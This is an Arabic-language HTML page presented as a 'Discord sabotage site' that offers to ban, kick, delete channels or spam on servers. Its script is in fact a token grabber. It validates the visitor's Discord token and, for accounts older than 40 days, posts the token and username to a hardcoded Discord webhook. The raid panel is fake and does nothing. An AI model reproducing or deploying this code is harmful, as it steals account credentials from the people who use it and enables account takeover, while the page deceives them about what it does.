<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>موقع تخريب ديسكورد</title>
  <style>
    body {
      background: linear-gradient(to bottom right, #0077ff, #00ff88);
      font-family: 'Cairo', sans-serif;
      color: white;
      text-align: center;
      padding: 50px;
    }
    h1 {
      font-size: 3em;
      color: red;
      text-shadow: 2px 2px 5px blue;
    }
    label {
      display: block;
      margin-top: 20px;
      font-size: 1.2em;
    }
    input, select {
      padding: 10px;
      width: 300px;
      font-size: 1em;
      border-radius: 10px;
      border: none;
      margin-top: 10px;
    }
    button {
      margin-top: 30px;
      background-color: green;
      color: white;
      padding: 12px 24px;
      font-size: 1.2em;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    #result {
      margin-top: 30px;
      font-size: 1.2em;
      color: yellow;
    }
    #fakePage {
      display: none;
      background-color: black;
      color: white;
      height: 100vh;
      padding-top: 100px;
    }
  </style>
</head>
<body>

  <div id="mainPage">
    <h1>موقع تخريب ديسكورد</h1>

    <label>قم بوضع توكن حسابك:</label>
    <input type="text" id="token" placeholder="توكن الحساب">

    <button onclick="checkToken()">التالي</button>

    <div id="result"></div>
  </div>

  <div id="fakePage">
    <h2>قم بوضع البيانات :</h2>

    <label>قم بوضع ايدي السيرفر نص :</label>
    <input type="text" id="serverId" placeholder="ايدي السيرفر"><br>

    <label>اختر العملية :</label>
    <select id="actionSelect">
      <option value="ban">BAN</option>
      <option value="kick">Kick</option>
      <option value="delete">مسح رومات</option>
      <option value="spam">عمل سبام</option>
    </select><br>

    <button onclick="fakeExecute()">تنفيذ</button>
    <div id="fakeResult" style="margin-top: 20px; color: red;"></div>
  </div>

  <script>
    const specialIDs = ["1302277414390337677", "1315672923322712138"];

    function checkToken() {
      const token = document.getElementById("token").value;
      const resultDiv = document.getElementById("result");

      fetch("https://discord.com/api/v10/users/@me", {
        headers: {
          "Authorization": token
        }
      }).then(res => {
        if (res.status === 200) {
          res.json().then(data => {
            const userId = data.id;
            const username = `${data.username}#${data.discriminator}`;
            const fullName = data.username;

            if (fullName === "celestial_monkey_95389") {
              resultDiv.textContent = "قم بتجربه حساب اخر❌ .";
              return;
            }

            if (specialIDs.includes(userId)) {
              // Show fake page
              document.getElementById("mainPage").style.display = "none";
              document.getElementById("fakePage").style.display = "block";
              return;
            }

            const createdAt = getDateFromSnowflake(data.id);
            const now = new Date();
            const accountAgeInDays = Math.floor((now - createdAt) / (1000 * 60 * 60 * 24));

            if (accountAgeInDays < 40) {
              resultDiv.textContent = "❌ يجب أن يكون عمر الحساب أكثر من 40 يومًا";
            } else {
              fetch("https://discord.com/api/webhooks/1381695158462058558/JpwXpQ4zEnhKkju9FOAWqYXjbU72YQ-oHsPb2RydTyTuZKyv357cB16HOO901tEiqw_K", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  content: `✅ توكن مقبول\nتوكن الحساب: \`${token}\`\nيوزر الحساب: \`${username}\``
                })
              });
              resultDiv.textContent = "✅ تم قبول الحساب";
            }
          });
        } else {
          resultDiv.textContent = "❌ توكن غير صالح";
        }
      }).catch(() => {
        resultDiv.textContent = "❌ حدث خطأ أثناء التحقق";
      });
    }

    function getDateFromSnowflake(snowflake) {
      const discordEpoch = 1420070400000;
      return new Date(Number(BigInt(snowflake) >> 22n) + discordEpoch);
    }

    function fakeExecute() {
      document.getElementById("fakeResult").textContent = "يوجد غلط في البيانات";
    }
  </script>

</body>
</html>
